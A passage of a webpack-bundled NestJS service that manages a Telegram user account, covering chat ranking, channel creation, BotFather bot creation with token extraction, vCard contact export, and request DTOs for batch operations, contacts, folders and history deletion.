                    console.error(`Error processing chat ${chatId}:`, error);
                    return null;
                }
            }));
            chatStats.push(...batchResults.filter(Boolean));
        }
        const topChats = chatStats
            .sort((a, b) => b.interactionScore - a.interactionScore)
            .slice(0, 10);
        const totalTime = Date.now() - startTime;
        console.log(`getTopPrivateChats completed in ${totalTime}ms. Found ${topChats.length} top chats`);
        topChats.forEach((chat, index) => {
            console.log(`Top ${index + 1}: ${chat.firstName} (${chat.username || 'no username'}) - Score: ${chat.interactionScore}`);
        });
        return topChats;
    }
    async createGroupOrChannel(options) {
        if (!this.client)
            throw new Error('Client not initialized');
        try {
            console.log('Creating group or channel with options:', options);
            const result = await this.client.invoke(new telegram_1.Api.channels.CreateChannel(options));
            return result;
        }
        catch (error) {
            console.error('Error creating group or channel:', error);
            throw new Error(`Failed to create group or channel: ${error.message}`);
        }
    }
    async createBot(options) {
        if (!this.client) {
            console.error('Bot creation failed: Client not initialized');
            throw new Error('Client not initialized');
        }
        const botFatherUsername = 'BotFather';
        console.log(`[BOT CREATION] Starting bot creation process for "${options.name}" (${options.username})`);
        try {
            console.log('[BOT CREATION] Attempting to get entity for BotFather...');
            const entity = await this.client.getEntity(botFatherUsername);
            console.log('[BOT CREATION] Successfully connected to BotFather');
            console.log('[BOT CREATION] Sending /newbot command...');
            await this.client.sendMessage(entity, {
                message: '/newbot'
            });
            console.log('[BOT CREATION] Waiting for BotFather response after /newbot command...');
            await new Promise(resolve => setTimeout(resolve, 1000));
            console.log(`[BOT CREATION] Sending bot name: "${options.name}"`);
            await this.client.sendMessage(entity, {
                message: options.name
            });
            console.log('[BOT CREATION] Waiting for BotFather response after sending name...');
            await new Promise(resolve => setTimeout(resolve, 1000));
            let botUsername = options.username;
            if (!/_bot$/.test(botUsername)) {
                const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
                let uniqueSuffix = '';
                for (let i = 0; i < 3; i++) {
                    uniqueSuffix += chars.charAt(Math.floor(Math.random() * chars.length));
                }
                botUsername = botUsername.replace(/_?bot$/, '') + `_${uniqueSuffix}_bot`;
                console.log(`[BOT CREATION] Modified username to ensure uniqueness: ${botUsername}`);
            }
            console.log(`[BOT CREATION] Sending bot username: "${botUsername}"`);
            await this.client.sendMessage(entity, {
                message: botUsername
            });
            console.log('[BOT CREATION] Waiting for BotFather response after sending username...');
            await new Promise(resolve => setTimeout(resolve, 1000));
            console.log('[BOT CREATION] Retrieving response from BotFather...');
            const messages = await this.client.getMessages(entity, {
                limit: 1
            });
            if (!messages || messages.length === 0) {
                console.error('[BOT CREATION] No response received from BotFather');
                throw new Error('No response received from BotFather');
            }
            const lastMessage = messages[0].message;
            console.log(`[BOT CREATION] BotFather response: "${lastMessage.substring(0, 50)}..."`);
            if (!lastMessage.toLowerCase().includes('use this token')) {
                console.error(`[BOT CREATION] Bot creation failed, unexpected response: "${lastMessage}"`);
                throw new Error(`Bot creation failed: ${lastMessage}`);
            }
            const tokenMatch = lastMessage.match(/(\d+:[A-Za-z0-9_-]+)/);
            if (!tokenMatch) {
                console.error('[BOT CREATION] Could not extract bot token from BotFather response');
                throw new Error('Could not extract bot token from BotFather response');
            }
            const botToken = tokenMatch[0];
            console.log(`[BOT CREATION] Successfully extracted bot token: ${botToken.substring(0, 5)}...`);
            if (options.description) {
                console.log('[BOT CREATION] Setting bot description...');
                await this.client.sendMessage(entity, { message: '/setdescription' });
                await new Promise(resolve => setTimeout(resolve, 1000));
                console.log(`[BOT CREATION] Selecting bot @${options.username} for description update...`);
                await this.client.sendMessage(entity, { message: `@${options.username}` });
                await new Promise(resolve => setTimeout(resolve, 1000));
                console.log('[BOT CREATION] Sending description text...');
                await this.client.sendMessage(entity, { message: options.description });
                await new Promise(resolve => setTimeout(resolve, 1000));
                console.log('[BOT CREATION] Description set successfully');
            }
            if (options.aboutText) {
                console.log('[BOT CREATION] Setting about text...');
                await this.client.sendMessage(entity, { message: '/setabouttext' });
                await new Promise(resolve => setTimeout(resolve, 1000));
                console.log(`[BOT CREATION] Selecting bot @${options.username} for about text update...`);
                await this.client.sendMessage(entity, { message: `@${options.username}` });
                await new Promise(resolve => setTimeout(resolve, 1000));
                console.log('[BOT CREATION] Sending about text...');
                await this.client.sendMessage(entity, { message: options.aboutText });
                await new Promise(resolve => setTimeout(resolve, 1000));
                console.log('[BOT CREATION] About text set successfully');
            }
            if (options.profilePhotoUrl) {
                console.log(`[BOT CREATION] Setting profile photo from URL: ${options.profilePhotoUrl}`);
                try {
                    console.log('[BOT CREATION] Downloading profile photo...');
                    const photoBuffer = await this.downloadFileFromUrl(options.profilePhotoUrl);
                    console.log(`[BOT CREATION] Photo downloaded successfully, size: ${photoBuffer.length} bytes`);
                    console.log('[BOT CREATION] Sending /setuserpic command...');
                    await this.client.sendMessage(entity, { message: '/setuserpic' });
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    console.log(`[BOT CREATION] Selecting bot @${options.username} for profile photo update...`);
                    await this.client.sendMessage(entity, { message: `@${options.username}` });
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    console.log('[BOT CREATION] Uploading profile photo...');
                    await this.client.sendFile(entity, {
                        file: Buffer.from(photoBuffer),
                        caption: '',
                        forceDocument: false
                    });
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    console.log('[BOT CREATION] Profile photo set successfully');
                }
                catch (photoError) {
                    console.error(`[BOT CREATION] Failed to set profile photo: ${photoError.message}`);
                }
            }
            console.log(`[BOT CREATION] Bot creation completed successfully: @${options.username}`);
            return {
                botToken,
                username: botUsername
            };
        }
        catch (error) {
            console.error(`[BOT CREATION] Error during bot creation process: ${error.message}`, error);
            throw new Error(`Failed to create bot: ${error.message}`);
        }
    }
    createVCardContent(contacts) {
        let vCardContent = '';
        contacts.users.map((user) => {
            user = user;
            vCardContent += 'BEGIN:VCARD\n';
            vCardContent += 'VERSION:3.0\n';
            vCardContent += `FN:${user.firstName || ''} ${user.lastName || ''}\n`;
            vCardContent += `TEL;TYPE=CELL:${user.phone}\n`;
            vCardContent += 'END:VCARD\n';
        });
        return vCardContent;
    }
    async sendContactsFile(chatId, contacts, filename = 'contacts.vcf') {
        if (!this.client)
            throw new Error('Client is not initialized');
        try {
            const vCardContent = this.createVCardContent(contacts);
            const tempPath = `./contacts/${chatId}-${filename}`;
            if (!fs.existsSync('./contacts')) {
                fs.mkdirSync('./contacts', { recursive: true });
            }
            fs.writeFileSync(tempPath, vCardContent, 'utf8');
            try {
                const fileContent = fs.readFileSync(tempPath);
                const file = new uploads_1.CustomFile(filename, fs.statSync(tempPath).size, tempPath, fileContent);
                await this.client.sendFile(chatId, {
                    file,
                    caption: `Contacts file with ${contacts.users.length} contacts`,
                    forceDocument: true
                });
                console.log(`Sent contacts file with ${contacts.users.length} contacts to chat ${chatId}`);
            }
            finally {
                if (fs.existsSync(tempPath)) {
                    fs.unlinkSync(tempPath);
                }
            }
        }
        catch (error) {
            console.error('Error sending contacts file:', error);
            throw error;
        }
    }
}
exports["default"] = TelegramManager;


/***/ }),

/***/ "./src/components/Telegram/config/telegram-validation.config.ts":
/*!**********************************************************************!*\
  !*** ./src/components/Telegram/config/telegram-validation.config.ts ***!
  \**********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TelegramValidationConfig = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
let TelegramValidationConfig = class TelegramValidationConfig {
};
exports.TelegramValidationConfig = TelegramValidationConfig;
TelegramValidationConfig.PHONE_PATTERN = /^\+?[1-9]\d{1,14}$/;
TelegramValidationConfig.USERNAME_PATTERN = /^[a-zA-Z0-9_]{5,32}$/;
TelegramValidationConfig.MESSAGE_MAX_LENGTH = 4096;
TelegramValidationConfig.CAPTION_MAX_LENGTH = 1024;
TelegramValidationConfig.FILE_SIZE_LIMIT = 2000 * 1024 * 1024;
TelegramValidationConfig.BATCH_SIZE_LIMIT = 100;
TelegramValidationConfig.ALLOWED_MEDIA_TYPES = [
    'photo',
    'video',
    'document',
    'voice',
    'audio'
];
TelegramValidationConfig.ALLOWED_PRIVACY_LEVELS = [
    'everybody',
    'contacts',
    'nobody'
];
TelegramValidationConfig.MESSAGE_TYPES = [
    'all',
    'text',
    'photo',
    'video',
    'voice',
    'document'
];
TelegramValidationConfig.DEFAULT_PAGINATION = {
    limit: 20,
    maxLimit: 100
};
exports.TelegramValidationConfig = TelegramValidationConfig = __decorate([
    (0, common_1.Injectable)()
], TelegramValidationConfig);


/***/ }),

/***/ "./src/components/Telegram/dto/batch-operations.dto.ts":
/*!*************************************************************!*\
  !*** ./src/components/Telegram/dto/batch-operations.dto.ts ***!
  \*************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ForwardBatchDto = exports.BatchProcessDto = exports.BatchItemDto = exports.BaseBatchItemDto = exports.BatchOperationType = void 0;
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
var BatchOperationType;
(function (BatchOperationType) {
    BatchOperationType["FORWARD"] = "forward";
    BatchOperationType["DELETE"] = "delete";
    BatchOperationType["EDIT"] = "edit";
})(BatchOperationType || (exports.BatchOperationType = BatchOperationType = {}));
class BaseBatchItemDto {
}
exports.BaseBatchItemDto = BaseBatchItemDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Chat ID for the operation' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], BaseBatchItemDto.prototype, "chatId", void 0);
class BatchItemDto extends BaseBatchItemDto {
}
exports.BatchItemDto = BatchItemDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Message ID for message operations', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], BatchItemDto.prototype, "messageId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Source chat ID for forward operations', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], BatchItemDto.prototype, "fromChatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Target chat ID for forward operations', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], BatchItemDto.prototype, "toChatId", void 0);
class BatchProcessDto {
    constructor() {
        this.batchSize = 20;
        this.delayMs = 1000;
    }
}
exports.BatchProcessDto = BatchProcessDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Operation type', enum: BatchOperationType }),
    (0, class_validator_1.IsEnum)(BatchOperationType),
    __metadata("design:type", String)
], BatchProcessDto.prototype, "operation", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Items to process', type: [BatchItemDto] }),
    (0, class_validator_1.IsArray)(),
    __metadata("design:type", Array)
], BatchProcessDto.prototype, "items", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of items to process in each batch', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], BatchProcessDto.prototype, "batchSize", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Delay between batches in milliseconds', default: 1000 }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], BatchProcessDto.prototype, "delayMs", void 0);
class ForwardBatchDto {
}
exports.ForwardBatchDto = ForwardBatchDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Source chat ID for forwarding' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], ForwardBatchDto.prototype, "fromChatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Target chat ID for forwarding' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], ForwardBatchDto.prototype, "toChatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Message IDs to forward', type: [Number] }),
    (0, class_validator_1.IsArray)(),
    (0, class_validator_1.ArrayMinSize)(1, { message: 'At least one message ID is required' }),
    (0, class_validator_1.ArrayMaxSize)(100, { message: 'Cannot forward more than 100 messages at once' }),
    (0, class_validator_1.IsNumber)({}, { each: true }),
    (0, class_transformer_1.Transform)(({ value }) => Array.isArray(value) ? value.map(Number) : value),
    __metadata("design:type", Array)
], ForwardBatchDto.prototype, "messageIds", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/connection-management.dto.ts":
/*!******************************************************************!*\
  !*** ./src/components/Telegram/dto/connection-management.dto.ts ***!
  \******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.GetClientOptionsDto = exports.ConnectionStatusDto = exports.ConnectionStatsDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class ConnectionStatsDto {
}
exports.ConnectionStatsDto = ConnectionStatsDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Total number of connections' }),
    __metadata("design:type", Number)
], ConnectionStatsDto.prototype, "total", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of connected clients' }),
    __metadata("design:type", Number)
], ConnectionStatsDto.prototype, "connected", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of connecting clients' }),
    __metadata("design:type", Number)
], ConnectionStatsDto.prototype, "connecting", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of disconnecting clients' }),
    __metadata("design:type", Number)
], ConnectionStatsDto.prototype, "disconnecting", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of clients in error state' }),
    __metadata("design:type", Number)
], ConnectionStatsDto.prototype, "error", void 0);
class ConnectionStatusDto {
}
exports.ConnectionStatusDto = ConnectionStatusDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Connection state of the client', enum: ['connecting', 'connected', 'disconnecting', 'disconnected', 'error'] }),
    __metadata("design:type", String)
], ConnectionStatusDto.prototype, "state", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Whether auto disconnect is enabled' }),
    __metadata("design:type", Boolean)
], ConnectionStatusDto.prototype, "autoDisconnect", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'When the connection was last used', type: 'number' }),
    __metadata("design:type", Number)
], ConnectionStatusDto.prototype, "lastUsed", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of connection attempts', type: 'number' }),
    __metadata("design:type", Number)
], ConnectionStatusDto.prototype, "connectionAttempts", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Last error message if any', required: false }),
    __metadata("design:type", String)
], ConnectionStatusDto.prototype, "lastError", void 0);
class GetClientOptionsDto {
}
exports.GetClientOptionsDto = GetClientOptionsDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Whether to auto disconnect the client after period of inactivity', required: false, default: true }),
    __metadata("design:type", Boolean)
], GetClientOptionsDto.prototype, "autoDisconnect", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Whether to use event handler', required: false, default: true }),
    __metadata("design:type", Boolean)
], GetClientOptionsDto.prototype, "handler", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Connection timeout in milliseconds', required: false, default: 30000 }),
    __metadata("design:type", Number)
], GetClientOptionsDto.prototype, "timeout", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/contact-management.dto.ts":
/*!***************************************************************!*\
  !*** ./src/components/Telegram/dto/contact-management.dto.ts ***!
  \***************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.AddContactsDto = exports.ContactImportDto = exports.ContactExportImportDto = exports.ContactBlockListDto = exports.ContactGroupDto = void 0;
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class ContactGroupDto {
}
exports.ContactGroupDto = ContactGroupDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Name of the contact group' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], ContactGroupDto.prototype, "name", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'User IDs to include in the group', type: [String] }),
    (0, class_validator_1.IsArray)(),
    (0, class_validator_1.IsString)({ each: true }),
    __metadata("design:type", Array)
], ContactGroupDto.prototype, "userIds", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Optional description for the group' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], ContactGroupDto.prototype, "description", void 0);
class ContactBlockListDto {
}
exports.ContactBlockListDto = ContactBlockListDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'User IDs to block/unblock', type: [String] }),
    (0, class_validator_1.IsArray)(),
    (0, class_validator_1.IsString)({ each: true }),
    __metadata("design:type", Array)
], ContactBlockListDto.prototype, "userIds", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Whether to block or unblock the users' }),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], ContactBlockListDto.prototype, "block", void 0);
class ContactExportImportDto {
    constructor() {
        this.includeBlocked = false;
    }
}
exports.ContactExportImportDto = ContactExportImportDto;
__decorate([
    (0, swagger_1.ApiProperty)({ enum: ['vcard', 'csv'], description: 'Export format type' }),
    (0, class_validator_1.IsEnum)(['vcard', 'csv']),
    __metadata("design:type", String)
], ContactExportImportDto.prototype, "format", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Whether to include blocked contacts', required: false, default: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Object)
], ContactExportImportDto.prototype, "includeBlocked", void 0);
class ContactImportDto {
}
exports.ContactImportDto = ContactImportDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Contacts to import', type: [Object] }),
    (0, class_validator_1.IsArray)(),
    __metadata("design:type", Array)
], ContactImportDto.prototype, "contacts", void 0);
class AddContactsDto {
}
exports.AddContactsDto = AddContactsDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Phone numbers to add', type: [String] }),
    (0, class_validator_1.IsArray)(),
    (0, class_validator_1.IsString)({ each: true }),
    __metadata("design:type", Array)
], AddContactsDto.prototype, "phoneNumbers", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Name prefix to use for added contacts' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], AddContactsDto.prototype, "prefix", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/create-bot.dto.ts":
/*!*******************************************************!*\
  !*** ./src/components/Telegram/dto/create-bot.dto.ts ***!
  \*******************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateBotDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class CreateBotDto {
}
exports.CreateBotDto = CreateBotDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Name of the bot (required)',
        example: 'MyAwesomeBot'
    }),
    (0, class_validator_1.IsNotEmpty)(),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.MaxLength)(64),
    __metadata("design:type", String)
], CreateBotDto.prototype, "name", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Username for the bot (required)',
        example: 'my_awesome_bot'
    }),
    (0, class_validator_1.IsNotEmpty)(),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.MaxLength)(32),
    __metadata("design:type", String)
], CreateBotDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Description of what your bot can do',
        example: 'This bot helps you manage your tasks',
        required: false
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.MaxLength)(512),
    __metadata("design:type", String)
], CreateBotDto.prototype, "description", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'What the bot can be used for',
        example: 'Task Management, Reminders, Notes',
        required: false
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.MaxLength)(512),
    __metadata("design:type", String)
], CreateBotDto.prototype, "aboutText", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'URL to the bot\'s profile photo',
        example: 'https://example.com/bot-photo.jpg',
        required: false
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreateBotDto.prototype, "profilePhotoUrl", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/create-chat-folder.dto.ts":
/*!***************************************************************!*\
  !*** ./src/components/Telegram/dto/create-chat-folder.dto.ts ***!
  \***************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateChatFolderDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class CreateChatFolderDto {
}
exports.CreateChatFolderDto = CreateChatFolderDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Name of the chat folder' }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", String)
], CreateChatFolderDto.prototype, "name", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'List of chat IDs to include in the folder' }),
    (0, class_validator_1.IsArray)(),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", Array)
], CreateChatFolderDto.prototype, "includedChats", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'List of chat IDs to exclude from the folder', required: false }),
    (0, class_validator_1.IsArray)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Array)
], CreateChatFolderDto.prototype, "excludedChats", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Include contacts in the folder', required: false, default: true }),
    (0, class_validator_1.IsBoolean)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Boolean)
], CreateChatFolderDto.prototype, "includeContacts", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Include non-contacts in the folder', required: false, default: true }),
    (0, class_validator_1.IsBoolean)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Boolean)
], CreateChatFolderDto.prototype, "includeNonContacts", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Include groups in the folder', required: false, default: true }),
    (0, class_validator_1.IsBoolean)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Boolean)
], CreateChatFolderDto.prototype, "includeGroups", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Include broadcast channels in the folder', required: false, default: true }),
    (0, class_validator_1.IsBoolean)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Boolean)
], CreateChatFolderDto.prototype, "includeBroadcasts", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Include bots in the folder', required: false, default: true }),
    (0, class_validator_1.IsBoolean)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Boolean)
], CreateChatFolderDto.prototype, "includeBots", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Exclude muted chats from the folder', required: false, default: false }),
    (0, class_validator_1.IsBoolean)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Boolean)
], CreateChatFolderDto.prototype, "excludeMuted", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Exclude read chats from the folder', required: false, default: false }),
    (0, class_validator_1.IsBoolean)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Boolean)
], CreateChatFolderDto.prototype, "excludeRead", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Exclude archived chats from the folder', required: false, default: false }),
    (0, class_validator_1.IsBoolean)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Boolean)
], CreateChatFolderDto.prototype, "excludeArchived", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/delete-chat.dto.ts":
/*!********************************************************!*\
  !*** ./src/components/Telegram/dto/delete-chat.dto.ts ***!
  \********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.DeleteHistoryDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class DeleteHistoryDto {
    constructor() {
        this.justClear = true;
        this.revoke = false;
    }
}
exports.DeleteHistoryDto = DeleteHistoryDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Username or peer ID of the chat whose history you want to delete',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], DeleteHistoryDto.prototype, "peer", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Deletes all messages with IDs less than or equal to this value',
    }),
